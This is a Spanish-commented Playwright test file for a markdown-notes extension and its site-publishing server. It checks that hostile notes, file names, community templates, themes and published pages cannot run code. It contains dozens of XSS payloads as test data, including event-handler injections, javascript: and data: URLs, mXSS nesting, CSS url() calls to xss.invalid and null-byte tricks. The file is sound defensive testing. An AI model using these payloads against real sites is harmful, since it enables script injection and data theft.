// Markdown hostil: ninguna carga puede ejecutar código, ni leyendo ni editando, ni desde el nombre de un archivo.
// Cada carga intenta poner window.__pwn. Se revisa además que en el artículo no queden manejadores, direcciones
// javascript:, ni etiquetas que no tienen por qué estar.
import { chromium } from 'playwright-core';
import fs from 'fs'; import os from 'os'; import path from 'path'; import { fileURLToPath } from 'url';
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'mdtools-'));
const ctx = await chromium.launchPersistentContext(profile, { headless: false, executablePath: chromium.executablePath(), viewport: { width: 1400, height: 900 }, locale: 'es-AR', ignoreDefaultArgs: ['--disable-extensions'],
  args: [`--disable-extensions-except=${root}`, `--load-extension=${root}`, '--headless=new', '--disable-features=DisableLoadExtensionCommandLineSwitch', '--lang=es-AR'] });
const sw = ctx.serviceWorkers()[0] || await ctx.waitForEvent('serviceworker'); const id = new URL(sw.url()).host;
const app = await ctx.newPage(); const errors = []; const dialogs = []; const odd = [];
app.on('pageerror', (e) => errors.push(e.message));
app.on('dialog', (d) => { dialogs.push(d.message()); d.dismiss().catch(() => {}); });
app.on('request', (r) => { if (/xss\.invalid/.test(r.url()) && r.resourceType() !== 'image') odd.push(r.resourceType() + ' ' + r.url()); });

const P = 'window.__pwn=1';
const HOSTIL = [
  '# Título <img src=x onerror="' + P + '">',
  '',
  '<script>' + P + '</script>',
  '<img src=x onerror="' + P + '">',
  '<svg onload="' + P + '"><script>' + P + '</script><a xlink:href="javascript:' + P + '"><text y="20">svg</text></a><foreignObject><body onload="' + P + '"></body></foreignObject></svg>',
  '<iframe src="javascript:' + P + '"></iframe><iframe srcdoc="<script>parent.__pwn=1</script>"></iframe>',
  '<object data="javascript:' + P + '"></object><embed src="javascript:' + P + '">',
  '<a href="javascript:' + P + '">enlace html</a> <a href="JaVaScRiPt:' + P + '">mayúsculas</a> <a href="&#106;avascript:' + P + '">entidad</a> <a href="data:text/html,<script>parent.__pwn=1</script>">data</a>',
  '<form action="https://xss.invalid/f"><button formaction="javascript:' + P + '">enviar</button><input onfocus="' + P + '" autofocus></form>',
  '<details open ontoggle="' + P + '"><summary>detalle</summary>x</details>',
  '<video src=x onerror="' + P + '"></video><audio src=x onerror="' + P + '"></audio><body onload="' + P + '">',
  '<math><mtext><table><mglyph><style><img src=x onerror="' + P + '"></style></mglyph></table></mtext></math>',
  '<style>@import "https://xss.invalid/a.css"; .lmd-topbar{display:none}</style>',
  '<base href="https://xss.invalid/"><meta http-equiv="refresh" content="0;url=javascript:' + P + '"><link rel="stylesheet" href="https://xss.invalid/b.css">',
  '<div data-act="reset" class="lmd-btn" style="position:fixed;inset:0;z-index:99999">tapa todo</div>',
  '<img src="https://xss.invalid/pixel.png" alt="imagen remota">',
  '',
  '[enlace md](javascript:' + P + ') [con espacios]( javascript:' + P + ' ) [vbscript](vbscript:msgbox(1)) [data](data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX19wd249MTwvc2NyaXB0Pg==)',
  '![img md](javascript:' + P + ') ![onerror](x"onerror="' + P + ')',
  '[[<img src=x onerror=' + P + '>]] [[nota#<svg onload=' + P + '>]]',
  '<' + 'javascript:' + P + '>',
  '',
  '| a | b |', '|---|---|', '| <img src=x onerror="' + P + '"> | `<script>' + P + '</script>` |',
  '',
  '- [ ] tarea <img src=x onerror="' + P + '">',
  '',
  '> [!NOTE]', '> aviso <img src=x onerror="' + P + '">',
  '',
  '::: details <img src=x onerror="' + P + '">', 'bloque', ':::',
  '',
  '$\\href{javascript:' + P + '}{math}$ y $$\\htmlData{onclick=' + P + '}{x} \\url{javascript:' + P + '}$$',
  '',
  '```mermaid', 'graph LR', '  A["<img src=x onerror=' + P + '>"] --> B["<script>' + P + '</script>"]', '  click A "javascript:' + P + '"', '  click B call __pwn()', '```',
  '',
  '```dot', 'digraph { a [label=<<b>x</b>> URL="javascript:' + P + '" tooltip="<img src=x onerror=' + P + '>"]; a -> b [href="javascript:' + P + '"] }', '```',
  '',
  '```html', '<script>' + P + '</script>', '```',
  '',
  '```kanban', '## <img src=x onerror="' + P + '">', '- [ ] <img src=x onerror="' + P + '">', '```',
  '',
  '*[HTML]: <img src=x onerror="' + P + '">', 'Abreviatura HTML.',
  '',
  'Nota al pie[^1].', '', '[^1]: <img src=x onerror="' + P + '">',
  '',
].join('\n');
const FRONT = '---\ntitle: "<img src=x onerror=' + P + '>"\ntags: ["<svg onload=' + P + '>"]\n---\n\n';

await app.goto(`chrome-extension://${id}/src/app.html`); await app.waitForSelector('[data-home=dir]');
await app.evaluate(async ([doc, front]) => {
  const dir = await (await navigator.storage.getDirectory()).getDirectoryHandle('hostil', { create: true });
  const write = async (d, name, data) => { const h = await d.getFileHandle(name, { create: true }); const s = await h.createWritable(); await s.write(data); await s.close(); };
  await write(dir, 'hostil.md', front + doc);
  // nombres de archivo y de carpeta con HTML: van al árbol, al índice, al título y a recientes
  await write(dir, '<img src=x onerror=window.__pwn=1>.md', '# <svg onload=window.__pwn=1>\n\ntexto\n');
  await write(dir, '"><svg onload=window.__pwn=1>.md', 'x\n');
  const sub = await dir.getDirectoryHandle('<b onmouseover=window.__pwn=1>carpeta', { create: true }); await write(sub, 'dentro.md', '# dentro\n');
  await write(dir, 'datos.csv', 'a,b\n"<img src=x onerror=window.__pwn=1>",2\n');
  window.showDirectoryPicker = async () => dir;
}, [HOSTIL, FRONT]);
await app.click('[data-home=dir]'); await app.waitForSelector('.lmd-sidebar');
const here = app.url();
const dlg = async (tag) => { const t = await app.evaluate(() => { const d = document.querySelector('.lmd-dlg, .lmd-ask'); return d ? d.innerText.replace(/\s+/g, ' ').slice(0, 160) : ''; }); if (t) { console.log('  (diálogo en ' + tag + ': ' + t + ')'); await app.keyboard.press('Escape'); await app.waitForTimeout(300); } };
const open = async (name) => { await dlg(name); await app.locator('.lmd-sidebar').getByText(name, { exact: true }).first().click(); await app.waitForSelector('.lmd-article:not([hidden])'); await app.waitForTimeout(2500); };
const scan = () => app.evaluate(() => {
  const bad = [];
  const where = (n) => n.closest('.lmd-article') ? 'artículo' : n.closest('.lmd-sidebar') ? 'barra' : 'otro';
  document.querySelectorAll('*').forEach((n) => {
    for (const a of n.attributes) {
      if (/^on/i.test(a.name)) bad.push(where(n) + ': ' + n.tagName + ' ' + a.name);
      if (/^(href|src|xlink:href|action|formaction|data|srcdoc)$/i.test(a.name) && /^\s*(javascript|vbscript):/i.test(a.value)) bad.push(where(n) + ': ' + n.tagName + ' ' + a.name + '=' + a.value.slice(0, 30));
      if (a.name === 'srcdoc') bad.push(where(n) + ': srcdoc');
    }
  });
  const art = document.querySelector('.lmd-article');
  ['script', 'iframe', 'object', 'embed', 'form', 'base', 'meta', 'link'].forEach((t) => { if (art && art.querySelector(t)) bad.push('artículo: <' + t + '>'); });
  // Mermaid dibuja sus etiquetas con foreignObject; el de un SVG pegado en la nota no tiene que sobrevivir.
  if (art && [...art.querySelectorAll('foreignObject')].some((n) => !n.closest('.lmd-diagram, .lmd-dgm-svg'))) bad.push('artículo: <foreignObject> fuera de un diagrama');
  if (art && art.querySelector('[data-act]')) bad.push('artículo: data-act');
  const fixed = art ? [...art.querySelectorAll('*')].filter((n) => /fixed|sticky/.test(getComputedStyle(n).position)).length : 0;
  const top = document.querySelector('.lmd-topbar'); const hidden = !top || getComputedStyle(top).display === 'none';
  return { pwn: window.__pwn, bad, fixed, hidden };
});

const o = {};
await open('hostil.md'); o.leer = await scan();
// pasar el mouse y hacer clic sobre todo lo que se pueda tocar, que es cuando disparan los manejadores perezosos
await app.evaluate(() => { document.querySelectorAll('.lmd-article a, .lmd-article summary, .lmd-article button, .lmd-article svg *').forEach((n) => { n.dispatchEvent(new MouseEvent('mouseover', { bubbles: true })); if (n.tagName !== 'A') n.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })); }); });
await app.waitForTimeout(500); o.tocar = await scan(); for (let i = 0; i < 40; i++) await dlg('tocar');
o.url1 = app.url();
await app.click('[data-act=mode-edit]'); await app.waitForTimeout(1500); o.editar = await scan(); await dlg('editar');
await app.click('[data-act=view-raw]'); await app.waitForTimeout(500); await app.click('[data-act=view-doc]'); await app.waitForTimeout(1500); o.volver = await scan();
await app.click('[data-act=mode-read]').catch(() => {}); await app.waitForTimeout(500);
await open('<img src=x onerror=window.__pwn=1>.md'); o.nombre = await scan(); o.titulo = await app.title();
await app.fill('.lmd-search input', 'onerror'); await app.waitForTimeout(2500); o.buscar = await scan();

// ---------- Aportes de la comunidad hostiles: en el almacenamiento y llegando del servidor ----------
await app.keyboard.press('Escape'); await app.fill('.lmd-search input', ''); await app.waitForTimeout(300);
await app.waitForFunction(() => !!(window.LMD && LMD.community && LMD.templates && LMD.diagram));
const COLORS = { fill: '#abcdef', text: '#1e3a8a', border: '#3b82f6', line: '#437ad3', second: '#e0e7ff', third: '#cffafe' };
const IMG = '<img src=x onerror=' + P + '>';
const TPL_BAD = { id: 7, name: IMG, about: '<svg onload=' + P + '>', lang: 'es', author: '<b onmouseover=' + P + '>x</b>', data: { text: HOSTIL } };
await app.evaluate(async ([tpl, img, colors]) => {
  await new Promise((r) => chrome.storage.local.set({ community: {
    templates: [tpl, { id: 8, name: 'Con clave de más', about: '', lang: 'es', author: 'Ana', data: { text: '# x', html: img } }, { id: 9, name: 'Sin texto', about: '', lang: 'es', author: 'Ana', data: {} }, { id: 10, name: 'Con correo', about: '', lang: 'es', author: 'ana@xss.invalid', data: { text: '# x' } }],
    palettes: [{ id: 3, name: '">' + img, about: '', lang: 'es', author: 'Ana', data: { colors } },
      { id: 4, name: 'Color con url', about: '', lang: 'es', author: 'Ana', data: { colors: Object.assign({}, colors, { fill: 'red;background:url(https://xss.invalid/p.png)' }) } }],
    theme: { id: 5, name: img, prev: { theme: 'auto', accent: 'red;background:url(https://xss.invalid/a.png)', paperLight: '', paperDark: '', fontFamily: 'x; } * { display: none', codeColor: 'url(https://xss.invalid/c.png)', diagramShape: 'round' } },
    author: img } }, r));
  await new Promise((r) => setTimeout(r, 400)); await LMD.community.ready();
}, [TPL_BAD, IMG, COLORS]);
o.guardado = await app.evaluate(() => ({ t: LMD.community.templates().map((t) => t.id), p: LMD.community.palettes().map((p) => p.id), prev: LMD.community.theme() && LMD.community.theme().prev }));
// La paleta agregada, en el menú de colores del editor de diagramas
o.paleta = await app.evaluate(() => { const D = LMD.diagram; const i = D.PALETTES.length; const code = D.withPalette('mermaid', 'graph LR\n  A --> B', i); return { ok: /#abcdef/.test(code) && D.paletteOf('mermaid', code) === i, pwn: window.__pwn }; });
// El selector de plantillas, y la nota creada con la plantilla hostil
await app.evaluate(() => document.querySelector('.lmd-tree-new').click()); await app.click('.lmd-menu [data-f=tpl]'); await app.waitForSelector('.lmd-tpl-card');
await app.click('.lmd-tpl-list [data-id="c:7"]'); await app.waitForTimeout(1500);
o.selector = await scan();
o.selectorNombre = await app.evaluate(() => document.querySelector('.lmd-tpl-list [data-id="c:7"]').textContent);
o.selectorMal = await app.evaluate(() => { const p = document.querySelector('.lmd-tpl-prev'); return ['script', 'iframe', 'object', 'embed', 'form', 'base', 'meta', 'link', 'style'].filter((t) => p.querySelector(t)); });
await app.keyboard.press('Enter'); await app.waitForSelector('.lmd-tpl-card', { state: 'detached' }); await app.waitForTimeout(3000); await dlg('plantilla');
o.creada = await scan();
// La galería, con un servidor que manda de todo
await app.evaluate(([tpl, img, colors, P]) => {
  const base = { about: '', lang: 'es', author: 'Ana' };
  const items = [
    Object.assign({ type: 'template', adds: '<img>' }, tpl, { data: undefined }),
    Object.assign({ id: 11, type: 'theme', name: 'Tema con CSS', data: { accent: '#112233', css: '* { display: none }' } }, base),
    Object.assign({ id: 12, type: 'theme', name: 'Tema con url', data: { accent: 'url(https://xss.invalid/t.png)' } }, base),
    Object.assign({ id: 13, type: 'theme', name: '<svg onload=' + P + '>', data: { accent: '#112233', font: 'Georgia' } }, base, { author: img }),
    Object.assign({ id: 14, type: 'palette', name: 'Paleta mala', data: { colors: Object.assign({}, colors, { text: 'expression(alert(1))' }) } }, base),
    Object.assign({ id: 15, type: 'script', name: 'Código', data: { js: P } }, base),
    Object.assign({ id: 16, type: 'theme', name: 'Tipografía remota', data: { font: 'url(https://xss.invalid/f.woff2)' } }, base),
    Object.assign({ id: 17, type: 'theme', name: 'Fondo ilegible', data: { paperLight: '#000000' } }, base),
    Object.assign({ id: '18', type: 'palette', name: 'Sin número', data: { colors } }, base),
    null, 'texto', 7,
  ];
  LMD.cloud.signedIn = () => true;
  LMD.cloud.api = async (m, p) => (p.startsWith('/gallery?') ? { items, pages: '<img>' } : p === '/gallery/7' ? Object.assign({ type: 'template' }, tpl)
    : p === '/gallery/mine' ? [{ id: 1, type: img, status: '">' + img, name: img, reason: '<svg onload=' + P + '>' }] : {});
}, [TPL_BAD, IMG, COLORS, P]);
await app.click('[data-act=settings]'); await app.waitForSelector('.lmd-panel-card'); await app.click('[data-ptab=tools]'); await app.waitForSelector('.lmd-gal-card'); await app.waitForSelector('.lmd-gal-my'); await app.waitForTimeout(500);
o.galeria = await scan();
o.tarjetas = await app.evaluate(() => [...document.querySelectorAll('.lmd-gal-card')].map((c) => c.dataset.gid));
await app.click('.lmd-gal-card[data-gid="13"] [data-gal=view]'); await app.waitForSelector('.lmd-gal-view .lmd-gal-sample'); o.vistaTema = await scan(); await app.click('.lmd-gal-view [data-gv=close]');
await app.click('.lmd-gal-card[data-gid="7"] [data-gal=view]'); await app.waitForSelector('.lmd-gal-view .lmd-gal-md'); await app.waitForTimeout(1200); o.vistaPlantilla = await scan();
o.vistaMal = await app.evaluate(() => { const p = document.querySelector('.lmd-gal-view .lmd-gal-md'); return ['script', 'iframe', 'object', 'embed', 'form', 'base', 'meta', 'link', 'style'].filter((t) => p.querySelector(t)); });
await app.click('.lmd-gal-view [data-gv=close]');
await app.click('.lmd-gal-theme [data-gal=back]'); await app.waitForTimeout(800);
o.volverTema = await scan(); o.estilo = await app.evaluate(() => (document.documentElement.getAttribute('style') || '') + ' ' + document.querySelector('style[data-lmd-custom], .lmd-custom-css, #lmd-custom')?.textContent);
await app.click('[data-act=close-panel]'); await app.waitForTimeout(200);

// ---------- Un sitio publicado con HTML hostil ----------
// Lo que llega al servidor para publicar lo arma un navegador, pero la ruta la puede llamar cualquiera con su sesión:
// acá se le manda HTML hostil a mano, sin pasar por la app, y se abre cada página en el host de sitios. Ninguna
// carga puede correr, y en la página no queda nada fuera de la lista blanca. Además se comprueba que la política de
// contenido del host frena un script, un manejador o un estilo en línea aunque alguno llegara a la página.
const sitio = { pwn: [], malas: [], dialogs: [], pedidos: [], errores: [], paginas: 0 };
{
  const { spawn } = await import('child_process'); const http = await import('http');
  const port = 21000 + Math.floor(Math.random() * 3000); const base = 'http://127.0.0.1:' + port; const PAGES = 'http://pages.localhost:' + port;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mdxss-'));
  const proc = spawn(process.execPath, [path.join(root, 'server', 'server.mjs')], { env: { ...process.env, PORT: String(port), DATA_DIR: dir, DEV_CODES: '1', ADMIN_KEY: 'clave-de-prueba', PUBLIC_URL: base, PAGES_URL: PAGES }, stdio: ['ignore', 'pipe', 'pipe'] });
  let log = ''; proc.stdout.on('data', (d) => { log += d; }); proc.stderr.on('data', (d) => { log += d; });
  for (let i = 0; i < 80 && !/puerto/.test(log); i++) await new Promise((r) => setTimeout(r, 100));
  const call = (m, p, b, s, extra) => fetch(base + p, { method: m, headers: Object.assign({ 'content-type': 'application/json' }, s ? { authorization: 'Bearer ' + s } : {}, extra || {}), body: b === undefined ? undefined : JSON.stringify(b) }).then(async (r) => ({ status: r.status, json: await r.json().catch(() => null) }));
  try {
    const mail = 'hostil@ejemplo.test'; const code = (await call('POST', '/auth/start', { email: mail })).json.dev_code; const s = (await call('POST', '/auth/verify', { email: mail, code })).json.session;
    await call('POST', '/admin/plan', { email: mail, plan: 'pro' }, undefined, { 'x-admin-key': 'clave-de-prueba' });
    const svgData = (xml) => 'data:image/svg+xml;base64,' + Buffer.from(xml).toString('base64');
    const CARGAS = [
      '<script>' + P + '</script><script src="data:text/javascript,' + P + '"></script><script src="https://xss.invalid/x.js"></script>',
      '<img src=x onerror="' + P + '"><img src="https://xss.invalid/a.png" onload="' + P + '" onerror="' + P + '"><image src=x onerror="' + P + '">',
      '<svg onload="' + P + '"><script>' + P + '</script><a xlink:href="javascript:' + P + '"><text y="20">svg</text></a><foreignObject><body onload="' + P + '"><iframe src="javascript:' + P + '"></iframe></body></foreignObject><animate onbegin="' + P + '" attributeName="x" dur="1s"/><set attributeName="onmouseover" to="' + P + '"/></svg>',
      '<svg><style>@import "https://xss.invalid/s.css"; *{background:url(https://xss.invalid/bg)}</style><use href="https://xss.invalid/u.svg#x"/><image href="https://xss.invalid/i.png"/></svg>',
      '<math><mtext><table><mglyph><style><img src=x onerror="' + P + '"></style></mglyph></table></mtext></math><math><annotation-xml encoding="text/html"><img src=x onerror="' + P + '"></annotation-xml></math>',
      '<math><mi href="javascript:' + P + '" xlink:href="javascript:' + P + '">clic</mi><maction actiontype="statusline#javascript:' + P + '">x</maction><mtext></form><form><mglyph><style></math><img src onerror="' + P + '">',
      '<iframe src="javascript:' + P + '"></iframe><iframe srcdoc="<script>parent.__pwn=1</script>"></iframe><object data="javascript:' + P + '"></object><embed src="javascript:' + P + '"><frameset onload="' + P + '"></frameset>',
      '<form action="javascript:' + P + '"><input autofocus onfocus="' + P + '"><button formaction="javascript:' + P + '">enviar</button><select autofocus onfocus="' + P + '"></select><textarea autofocus onfocus="' + P + '"></textarea></form>',
      '<a href="javascript:' + P + '" id="j1">uno</a> <a href="JaVaScRiPt:' + P + '">dos</a> <a href="&#106;avascript:' + P + '">tres</a> <a href="java&#x09;script:' + P + '">cuatro</a> <a href=" &#14; javascript:' + P + '">cinco</a> <a href="javascript&colon;' + P + '">seis</a> <a href="data:text/html,<script>parent.__pwn=1</script>">siete</a> <a href="vbscript:msgbox(1)">ocho</a>',
      '<img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><script>' + P + ';parent.__pwn=1;top.__pwn=1</script><rect width="40" height="40" onclick="' + P + '"/></svg>') + '"><img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" onload="' + P + '"/>') + '"><img src="data:text/html,<script>' + P + '</script>">',
      '<img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:parent.__pwn=1"></iframe></foreignObject></svg>') + '" alt="marco adentro">',
      '<style>@import "https://xss.invalid/a.css"; .sp-top,.sp-foot{display:none} body{background:url(https://xss.invalid/b)}</style><link rel="stylesheet" href="https://xss.invalid/l.css"><p style="position:fixed;inset:0;background:url(https://xss.invalid/c);z-index:99999">tapa todo</p>',
      '<base href="https://xss.invalid/"><meta http-equiv="refresh" content="0;url=https://xss.invalid/fuera"><meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\'"><title>otro</title>',
      '<details open ontoggle="' + P + '"><summary onclick="' + P + '">detalle</summary>x</details><video src=x onerror="' + P + '" autoplay></video><audio src=x onerror="' + P + '"></audio><marquee onstart="' + P + '">m</marquee><body onload="' + P + '" onpageshow="' + P + '">',
      '<div class="sp-top sp-preview" id="sp-main">disfraz</div><a class="sp-made" href="https://xss.invalid/falso">Published with SharpMD</a><label for="sp-navt">Menu</label><div id="sp-navt">x</div><p class="sp-report" data-s="otro-sitio" data-p="">denuncia falsa<button>ok</button></p>',
      '<noscript><p title="</noscript><img src=x onerror=' + P + '>"></noscript><template><img src=x onerror="' + P + '"></template><xmp><img src=x onerror="' + P + '"></xmp><textarea></textarea><img src=x onerror="' + P + '">',
      '<!--><img src=x onerror="' + P + '">--><!-- --!><img src=x onerror="' + P + '"><![CDATA[<img src=x onerror="' + P + '">]]><?pi <img src=x onerror="' + P + '">?>',
      '<p title="&quot;><img src=x onerror=' + P + '>">título</p><img src="https://xss.invalid/q.png" alt="&quot;><img src=x onerror=' + P + '>"><a href="https://xss.invalid/?a=&quot;><img src=x onerror=' + P + '>">comillas</a><h2 id="&quot;><img src=x onerror=' + P + '>">ancla</h2>',
      '<a data-wiki="&quot;><img src=x onerror=' + P + '>">wiki</a> <a data-wiki="javascript:' + P + '">wiki 2</a> <a href="../../../../etc/passwd">arriba</a> <a href="pag-2.md#&quot;><img src=x onerror=' + P + '>">sección</a> <a href="//xss.invalid/x" target="_top" onclick="' + P + '">doble barra</a>',
      '\u0000<scr\u0000ipt>' + P + '</scr\u0000ipt><img src=x one\u0000rror="' + P + '"><a href="java\u0000script:' + P + '">nulo</a><svg><script>' + P + '</script>'.repeat(30) + '<img src=x onerror="' + P + '">',
    ];
    for (let i = 0; i < CARGAS.length; i++) await call('PUT', '/notes/' + encodeURIComponent('hostil/pag-' + i + '.md'), { text: '# Página ' + i }, s);
    const st = (await call('POST', '/sites', { folder: 'hostil', slug: 'hostil', title: '<img src=x onerror=' + P + '>', descr: '"><script>' + P + '</script>', logo: '<svg onload=' + P + '>', author: '<script>' + P + '</script>' }, s)).json;
    for (let i = 0; i < CARGAS.length; i++) await call('PUT', '/sites/' + st.id + '/pages', { pages: [{ note: 'hostil/pag-' + i + '.md', rev: 1, title: '<img src=x onerror=' + P + '> ' + i, descr: '"><script>' + P + '</script>', html: '<h1>Página ' + i + '</h1>' + CARGAS[i] + '<p>fin</p>' }] }, s);
    await call('POST', '/sites/' + st.id + '/publish', {}, s);
    const pg = await ctx.newPage();
    pg.on('pageerror', (e) => sitio.errores.push(e.message)); pg.on('dialog', (d) => { sitio.dialogs.push(d.message()); d.dismiss().catch(() => {}); });
    pg.on('request', (r) => { if (/xss\.invalid/.test(r.url()) && r.resourceType() !== 'image') sitio.pedidos.push(r.resourceType() + ' ' + r.url()); });
    pg.on('framenavigated', (f) => { if (f === pg.mainFrame() && !f.url().startsWith(PAGES) && f.url() !== 'about:blank') sitio.pedidos.push('navegó a ' + f.url()); });
    const OK = 'a abbr b blockquote br caption cite code col colgroup dd del details dfn div dl dt em figcaption figure h1 h2 h3 h4 h5 h6 hr i img ins kbd li mark nav ol p pre q rp rt ruby s samp section small span strong sub summary sup table tbody td tfoot th thead tr u ul var wbr math semantics mrow mi mo mn ms mtext mspace msup msub msubsup mfrac msqrt mroot munder mover munderover mtable mtr mtd mstyle mpadded mphantom menclose merror';
    for (let i = 0; i < CARGAS.length; i++) {
      await pg.goto(PAGES + '/hostil/pag-' + i); await pg.waitForSelector('.sp-body'); await pg.waitForTimeout(250);
      // Pasar el mouse y dar foco a todo lo del cuerpo, y un clic en cada enlace que no saca de la página.
      await pg.evaluate(() => { document.querySelectorAll('.sp-body *').forEach((n) => { for (const t of ['mouseover', 'mouseenter', 'focus', 'pointerover', 'toggle', 'load', 'error']) n.dispatchEvent(new Event(t, { bubbles: true })); if (n.tagName === 'A' && !/^https?:/.test(n.getAttribute('href') || '')) n.click(); if (n.tagName === 'SUMMARY') n.click(); }); });
      await pg.waitForTimeout(150);
      const r = await pg.evaluate((ok) => {
        const allow = new Set(ok.split(' ')); const bad = []; const body = document.querySelector('.sp-body');
        body.querySelectorAll('*').forEach((n) => {
          if (!allow.has(n.localName)) bad.push('etiqueta ' + n.localName);
          for (const a of n.attributes) {
            if (/^on/i.test(a.name) || ['style', 'srcset', 'target', 'ping', 'name', 'action', 'formaction', 'srcdoc', 'xlink:href', 'background'].includes(a.name.toLowerCase()) || /^data-/i.test(a.name)) bad.push('atributo ' + a.name + ' en ' + n.localName);
            if ((a.name === 'href' || a.name === 'src') && !/^(https:\/\/|#|\/hostil\/|data:image\/)/i.test(a.value.trim())) bad.push(a.name + ' ' + a.value.slice(0, 60));
            if (a.name === 'id' && /^sp-/.test(a.value)) bad.push('id ' + a.value); if (a.name === 'class' && /(^|\s)sp-(?!al-|check|on|noimg)/.test(a.value)) bad.push('clase ' + a.value);
          }
        });
        return { pwn: window.__pwn, bad, scripts: document.scripts.length, src: [...document.scripts].map((x) => x.getAttribute('src').split('?')[0]).join(), styles: document.querySelectorAll('style, [style]').length, sheets: document.styleSheets.length, base: document.querySelectorAll('base, meta[http-equiv]').length,
          title: document.title, made: [...document.querySelectorAll('.sp-made')].map((a) => a.href).join(), top: getComputedStyle(document.querySelector('.sp-top')).display, mains: document.querySelectorAll('#sp-main').length, reports: document.querySelectorAll('.sp-report').length };
      }, OK);
      sitio.paginas++;
      if (r.pwn !== undefined) sitio.pwn.push(i);
      if (r.bad.length || r.scripts !== 1 || r.src !== '/_/site.js' || r.styles !== 0 || r.sheets !== 1 || r.base !== 0 || r.made !== 'https://sharpmd.app/' || r.top === 'none' || r.mains !== 1 || r.reports !== 0 || !/onerror/.test(r.title)) sitio.malas.push([i, r]);
    }
    // La política de contenido, sola: aunque algo llegara a la página, no corre ni se aplica.
    await pg.goto(PAGES + '/hostil/pag-0'); await pg.waitForSelector('.sp-body');
    sitio.csp = await pg.evaluate(async () => {
      const b = document.querySelector('.sp-body'); const out = {};
      const sc = document.createElement('script'); sc.textContent = 'window.__csp1 = 1'; b.appendChild(sc);
      const ext = document.createElement('script'); ext.src = 'data:text/javascript,window.__csp2=1'; b.appendChild(ext);
      const im = document.createElement('div'); im.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__csp3=1" onerror="window.__csp3=1">'; b.appendChild(im);
      const a = document.createElement('a'); a.href = 'javascript:window.__csp4=1'; a.textContent = 'x'; b.appendChild(a); a.click();
      const st = document.createElement('style'); st.textContent = '.sp-top{display:none !important}'; document.head.appendChild(st);
      const p = document.createElement('p'); p.setAttribute('style', 'position:fixed'); b.appendChild(p);
      const fr = document.createElement('iframe'); fr.src = 'https://xss.invalid/marco'; b.appendChild(fr);
      let fetched = 'no'; try { await fetch('https://xss.invalid/datos'); fetched = 'salió'; } catch (e) { fetched = 'cortado'; }

      await new Promise((r) => setTimeout(r, 500));
      return { c1: window.__csp1, c2: window.__csp2, c3: window.__csp3, c4: window.__csp4, top: getComputedStyle(document.querySelector('.sp-top')).display, pos: getComputedStyle(p).position, fetched };
    });
    sitio.cabeceras = await (async () => { const r = await new Promise((resolve) => { const q = http.request({ host: '127.0.0.1', port, path: '/hostil/pag-0', headers: { host: 'pages.localhost:' + port } }, (res) => { res.resume(); res.on('end', () => resolve(res.headers)); }); q.end(); }); return r; })();
    sitio.log = /error 500|sitios: error|error no capturado/.test(log);
    await pg.close();
  } catch (e) { sitio.errores.push(String(e && e.stack || e)); }
  proc.kill(); await new Promise((r) => setTimeout(r, 300)); try { fs.rmSync(dir, { recursive: true, force: true }); } catch (e) { /* Windows lo suelta después */ }
}

const limpio = (s) => s && s.pwn === undefined && s.bad.length === 0;
const checks = [
  ['leyendo, ninguna carga ejecuta código ni deja manejadores', limpio(o.leer), o.leer],
  ['al pasar el mouse y hacer clic tampoco', limpio(o.tocar), o.tocar],
  ['el HTML de la nota no tapa la interfaz ni usa las acciones de la app', o.leer.fixed === 0 && o.leer.hidden === false, [o.leer.fixed, o.leer.hidden]],
  ['editando, tampoco', limpio(o.editar), o.editar],
  ['al pasar por el código y volver, tampoco', limpio(o.volver), o.volver],
  ['un nombre de archivo o de carpeta con HTML se muestra como texto', limpio(o.nombre), [o.nombre, o.titulo]],
  ['los resultados de búsqueda muestran el texto sin interpretarlo', limpio(o.buscar), o.buscar],
  ['un aporte de la comunidad guardado que no calza con el esquema se descarta, y lo que queda tiene la forma que le toca', o.guardado.t.join() === '7' && o.guardado.p.join() === '3' && o.guardado.prev.accent === '' && o.guardado.prev.fontFamily === '' && o.guardado.prev.codeColor === '', o.guardado],
  ['una plantilla de la comunidad hostil no ejecuta nada en el selector, y su nombre se muestra como texto', limpio(o.selector) && o.selectorMal.length === 0 && o.selectorNombre === '<img src=x onerror=' + P + '>', [o.selector, o.selectorMal, o.selectorNombre]],
  ['la nota creada con esa plantilla tampoco', limpio(o.creada), o.creada],
  ['una paleta de la comunidad con HTML en el nombre se muestra como texto en el editor de diagramas', o.paleta.ok && o.paleta.pwn === undefined, o.paleta],
  ['la galería descarta lo que llega con CSS, url(), claves de más o un tipo que no existe', o.tarjetas.join() === '7,13', o.tarjetas],
  ['y muestra como texto los nombres, autores, estados y motivos', limpio(o.galeria) && limpio(o.vistaTema) && limpio(o.vistaPlantilla) && o.vistaMal.length === 0, [o.galeria, o.vistaTema, o.vistaPlantilla, o.vistaMal]],
  ['volver de un tema guardado con valores hostiles no mete nada en los estilos', limpio(o.volverTema) && !/xss\.invalid|display/.test(o.estilo), [o.volverTema, o.estilo]],
  ['sitio publicado: ninguna de las cargas mandadas a mano al servidor ejecuta código en el host de sitios', sitio.paginas >= 20 && sitio.pwn.length === 0 && sitio.dialogs.length === 0 && sitio.errores.length === 0, [sitio.paginas, sitio.pwn, sitio.dialogs, sitio.errores.slice(0, 2)]],
  ['sitio publicado: en cada página queda solo lo de la lista blanca, con el único script y la única hoja del host, y la plantilla intacta', sitio.malas.length === 0, sitio.malas.slice(0, 2)],
  ['sitio publicado: no sale ningún pedido que no sea una imagen, y ninguna página navega fuera del host', sitio.pedidos.length === 0, sitio.pedidos.slice(0, 4)],
  ['sitio publicado: la política de contenido frena por su cuenta un script en línea o de otro lado, un manejador, un javascript:, un estilo en línea, un marco y un pedido a otro servidor', !!sitio.csp && sitio.csp.c1 === undefined && sitio.csp.c2 === undefined && sitio.csp.c3 === undefined && sitio.csp.c4 === undefined && sitio.csp.top !== 'none' && sitio.csp.pos !== 'fixed' && sitio.csp.fetched === 'cortado', sitio.csp],
